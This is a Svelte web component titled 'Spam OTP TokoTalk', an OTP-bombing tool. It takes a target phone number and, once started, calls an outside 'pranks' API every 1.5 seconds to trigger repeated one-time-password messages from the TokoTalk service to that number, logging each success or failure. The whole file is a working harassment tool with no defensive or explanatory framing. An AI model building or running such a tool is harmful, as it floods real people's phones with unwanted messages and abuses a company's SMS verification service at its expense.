<script>
  import axios from 'axios'
  import {onMount} from 'svelte'

  let auto = false

  let data = {
    target: null
  }

  onMount(() => {
    setInterval(async () => {
      if (auto) {
        const textarea = document.getElementById('textarea')
        textarea.value += '⚠  ' + await spam(data.target) +'\n'
        textarea.scrollTop = textarea.scrollHeight
      }
    }, 1500)
  })

  async function spam (target) {
    try {
      const request = await axios.get(`https://pranks.masterkadal.com/api/tokotalk/${target}`)
      const status = request.data.data ? 'Successfully ✅' : 'Failed ❌'
      return target + ' : ' + status
    } catch (e) {
      console.log(e)
      return target + ' : ' + 'Something went wrong 💢'
    }
  }
</script>

<slot>
  <h1>Spam OTP TokoTalk</h1>
  <div class="columns">
    <div class="column col-12">
      <div class="col-md-12 col-6">
        <div class="input-group">
          <span class="input-group-addon">Target</span>
          <input class="form-input" type="number" id="input-target" placeholder="6285..." class:disabled={auto} bind:value={data.target}>
          <button class="btn btn-primary input-group-btn px-2" on:click={() => {auto = !auto} }>
            {auto ? 'Stop' : 'Start'}
          </button>
        </div>
      </div>
    </div>
    <div class="column col-12">
      <div class="form-group">
        <label class="form-label" for="input-reuslt">Result</label>
        <textarea class="form-input" id="textarea" placeholder="Hasil akan keluar disini" rows="9"></textarea>
      </div>
    </div>
  </div>
</slot>